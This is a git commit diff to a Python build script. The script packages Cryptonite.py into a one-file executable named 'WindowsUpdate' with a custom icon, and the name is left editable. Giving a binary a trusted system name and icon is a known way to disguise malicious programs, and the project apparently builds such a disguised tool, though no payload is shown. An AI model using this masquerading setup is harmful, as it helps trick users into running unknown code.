2f77de5ad1812d6d30ff892113e2b1ffbfc6b381
Pranav <pranavcosmos4@gmail.com>
2021-08-08 05:15:02 +0530

    fixed some mistakes

--- generate.py
+++ generate.py
@@ -2,10 +2,11 @@ import os
 
 OS = os.name
 PATH = os.path.abspath(".")
-FILE = "WindowsUpdate"
-os.system(f"pyinstaller --onefile Cryptonite.py --name WindowsUpdate")
+FILE = "WindowsUpdate"  #                   <------- EDIT THIS
+
+os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
 if OS == "nt":
-    os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q WindowsUpdate.spec")
+    os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
 else:
     os.system(f"mv /dist/{FILE}.exe ./")
     os.system(f"rm -r __pycache__")
